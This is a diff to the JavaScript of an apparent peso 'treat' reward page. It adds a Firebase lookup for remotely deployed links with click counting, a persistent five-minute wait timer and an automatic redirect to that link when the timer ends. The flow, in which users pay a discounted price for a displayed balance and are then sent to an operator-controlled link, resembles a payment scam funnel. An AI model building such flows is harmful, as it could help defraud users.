@@ -13,7 +13,8 @@
       discount: '-22%',
       oldPrice: '₱700',
       newPrice: '545',
-      amount: 1500
+      amount: 1500,
+      type: 'treat1'
     },
     2: {
       img: 'photos/3000iva.png',
@@ -21,7 +22,8 @@
       discount: '-28%',
       oldPrice: '₱1,500',
       newPrice: '1,080',
-      amount: 3000
+      amount: 3000,
+      type: 'treat2'
     }
   };
 
@@ -65,10 +67,131 @@
   let timerInterval = null;
   let timeRemaining = 0;
   let isTimerRunning = false;
+  let treatLink = null;
+  let isRedirecting = false;
+  let pendingRedirect = false;
+
+  // ===== FIREBASE REFERENCE =====
+  const database = firebase.database();
 
   // ===== HELPER: Format number with commas =====
   function formatWithCommas(number) {
     return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+  }
+
+  // ===== CHECK FOR DEPLOYED LINK =====
+  async function checkForDeployedLink(treatType) {
+    try {
+      console.log('🔍 Checking for deployed link for:', treatType);
+      const snapshot = await database.ref('treat_links')
+        .orderByChild('type')
+        .equalTo(treatType)
+        .once('value');
+      
+      const links = snapshot.val();
+      if (links) {
+        const linkIds = Object.keys(links);
+        const latestId = linkIds[linkIds.length - 1];
+        const linkData = links[latestId];
+        
+        // Increment click count
+        const newClickCount = (linkData.clicks || 0) + 1;
+        await database.ref('treat_links/' + latestId + '/clicks').set(newClickCount);
+        
+        console.log('✅ Link found:', linkData.url);
+        return linkData.url;
+      } else {
+        console.log('❌ No link deployed for this treat');
+        return null;
+      }
+    } catch (error) {
+      console.error('❌ Error checking for link:', error);
+      return null;
+    }
+  }
+
+  // ===== CHECK PERSISTENT TIMER ON LOAD =====
+  function checkPersistentTimer() {
+    const timerData = localStorage.getItem('treat_timer');
+    if (!timerData) return false;
+    
+    try {
+      const data = JSON.parse(timerData);
+      const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
+      const remaining = data.duration - elapsed;
+      
+      console.log('⏰ Persistent timer found:', { elapsed, remaining, duration: data.duration });
+      
+      if (remaining > 0) {
+        // Timer is still running
+        timeRemaining = remaining;
+        isTimerRunning = true;
+        selectedCard = data.selectedCard;
+        treatLink = data.treatLink;
+        
+        // Update balance
+        const cardNumber = parseInt(selectedCard.replace('card', ''));
+        if (cardNumber && cardData[cardNumber]) {
+          currentBalance = cardData[cardNumber].amount;
+          updateBalance(currentBalance, true);
+        }
+        
+        // Start timer display
+        startTimerDisplay(remaining);
+        
+        // Check if redirect is pending
+        if (data.pendingRedirect && data.treatLink) {
+          pendingRedirect = true;
+          // Auto-redirect after checking
+          setTimeout(() => {
+            if (data.treatLink) {
+              window.location.href = data.treatLink;
+            }
+          }, 1000);
+        }
+        
+        return true;
+      } else {
+        // Timer expired - clear storage and check for redirect
+        localStorage.removeItem('treat_timer');
+        if (data.treatLink && data.pendingRedirect) {
+          // Auto-redirect to the link
+          window.location.href = data.treatLink;
+        }
+        return false;
+      }
+    } catch (e) {
+      console.error('Error parsing timer data:', e);
+      localStorage.removeItem('treat_timer');
+      return false;
+    }
+  }
+
+  // ===== START TIMER DISPLAY =====
+  function startTimerDisplay(seconds) {
+    const minutes = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    const timeStr = String(minutes).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+    
+    if (claimTimerDisplay) {
+      claimTimerDisplay.textContent = timeStr;
+    }
+    
+    claimPayBtn.classList.add('disabled');
+    claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">' + timeStr + '</span>';
+  }
+
+  // ===== SAVE TIMER STATE =====
+  function saveTimerState(duration, link, cardId) {
+    const timerData = {
+      startTime: Date.now(),
+      duration: duration,
+      selectedCard: cardId,
+      treatLink: link,
+      pendingRedirect: !!link
+    };
+    localStorage.setItem('treat_timer', JSON.stringify(timerData));
+    console.log('💾 Timer state saved:', timerData);
   }
 
   // ===== IMAGE ERROR HANDLING =====
@@ -153,7 +276,6 @@
     const amountSpan = balanceElement;
     amountSpan.classList.remove('increment', 'decrement');
     void amountSpan.offsetWidth;
-    // Display with commas and 2 decimal places
     amountSpan.textContent = formatWithCommas(newAmount) + '.00';
     if (isIncrement) {
       amountSpan.classList.add('increment');
@@ -208,7 +330,6 @@
     cardPopupOldPrice.textContent = data.oldPrice;
     cardPopupNewPrice.textContent = data.newPrice;
     cardPopupDiscount.textContent = data.discount;
-    // Display with commas
     cardPopupReward.textContent = formatWithCommas(parseInt(data.badge.replace('₱', '').replace(/,/g, '')));
     
     updateCardPopupButtonState();
@@ -270,12 +391,26 @@
     claimPopupOldPrice.textContent = data.oldPrice;
     claimPopupNewPrice.textContent = data.newPrice;
     claimPopupDiscount.textContent = data.discount;
-    // Display with commas
     claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
     claimPopupPhone.textContent = userPhone;
     
+    // Reset timer and check for link
     resetClaimTimer();
-    updateClaimPopupButtonState();
+    treatLink = null;
+    isRedirecting = false;
+    pendingRedirect = false;
+    
+    // Check if there's a deployed link for this treat
+    checkForDeployedLink(data.type).then(link => {
+      treatLink = link;
+      if (link) {
+        console.log('🔗 Deployed link found:', link);
+        claimPayBtn.innerHTML = '<i class="fas fa-link"></i> PAY TREATS <span class="timer-display" id="claimTimerDisplay"></span>';
+      } else {
+        console.log('ℹ️ No link deployed, timer will proceed normally');
+      }
+      updateClaimPopupButtonState();
+    });
     
     claimPopupOverlay.classList.add('active');
     document.body.style.overflow = 'hidden';
@@ -308,6 +443,10 @@
     
     timeRemaining = 300;
     isTimerRunning = true;
+    
+    // Save timer state to localStorage
+    saveTimerState(timeRemaining, treatLink, selectedCard);
+    
     claimPayBtn.classList.add('disabled');
     claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">5:00</span>';
     
@@ -322,10 +461,36 @@
         display.textContent = timeStr;
       }
       
+      // Update localStorage every 5 seconds
+      if (timeRemaining % 5 === 0) {
+        saveTimerState(timeRemaining, treatLink, selectedCard);
+      }
+      
       if (timeRemaining <= 0) {
         clearInterval(timerInterval);
         timerInterval = null;
         isTimerRunning = false;
+        
+        // Clear timer from localStorage
+        localStorage.removeItem('treat_timer');
+        
+        // Check if there's a link to redirect to
+        if (treatLink && !isRedirecting) {
+          isRedirecting = true;
+          claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING... <span class="timer-display" id="claimTimerDisplay"></span>';
+          
+          // Show toast notification
+          showToast('🔗 Redirecting to treat link...');
+          
+          // Redirect after a short delay
+          setTimeout(function() {
+            window.location.href = treatLink;
+          }, 1500);
+          
+          return;
+        }
+        
+        // No link found - proceed normally
         claimPayBtn.classList.remove('disabled');
         claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY NOW <span class="timer-display" id="claimTimerDisplay"></span>';
         alert('⏰ Time is up! You can now proceed.');
@@ -340,12 +505,35 @@
     }
     isTimerRunning = false;
     timeRemaining = 0;
+    isRedirecting = false;
+    pendingRedirect = false;
+    localStorage.removeItem('treat_timer');
     claimPayBtn.classList.remove('disabled');
     const display = document.getElementById('claimTimerDisplay');
     if (display) {
       display.textContent = '';
     }
     updateClaimPopupButtonState();
+  }
+
+  // ===== SHOW TOAST =====
+  function showToast(message, isError = false) {
+    const existingToast = document.querySelector('.toast-message');
+    if (existingToast) {
+      existingToast.remove();
+    }
+    
+    const toast = document.createElement('div');
+    toast.className = 'toast-message' + (isError ? ' error' : '');
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    
+    setTimeout(() => {
+      toast.style.animation = 'toastSlideDown 0.3s ease';
+      setTimeout(() => {
+        toast.remove();
+      }, 300);
+    }, 3000);
   }
 
   // Claim Popup Event Listeners
@@ -384,4 +572,50 @@
     }
   });
 
+  // ===== INITIALIZE - CHECK PERSISTENT TIMER =====
+  // Check if there's an active timer from previous session
+  const hasActiveTimer = checkPersistentTimer();
+  
+  if (!hasActiveTimer) {
+    console.log('ℹ️ No active timer found');
+  }
+
+  // Add toast styles if not already present
+  const style = document.createElement('style');
+  style.textContent = `
+    .toast-message {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(3, 8, 7, 0.90);
+      backdrop-filter: blur(16px);
+      color: #fff;
+      padding: 0.8rem 1.8rem;
+      border-radius: 18px;
+      border: 1px solid rgba(0, 180, 255, 0.10);
+      font-family: 'Inter', sans-serif;
+      font-size: 0.9rem;
+      font-weight: 500;
+      z-index: 9998;
+      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
+      animation: toastSlideUp 0.3s ease;
+      max-width: 85%;
+      text-align: center;
+    }
+    .toast-message.error {
+      border-color: rgba(255, 50, 50, 0.15);
+    }
+    @keyframes toastSlideUp {
+      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+    @keyframes toastSlideDown {
+      from { opacity: 1; transform: translateX(-50%) translateY(0); }
+      to { opacity: 0; transform: translateX(-50%) translateY(20px); }
+    }
+  `;
+  document.head.appendChild(style);
+
+  console.log('✅ Main.js initialized with persistent timer');
 })();
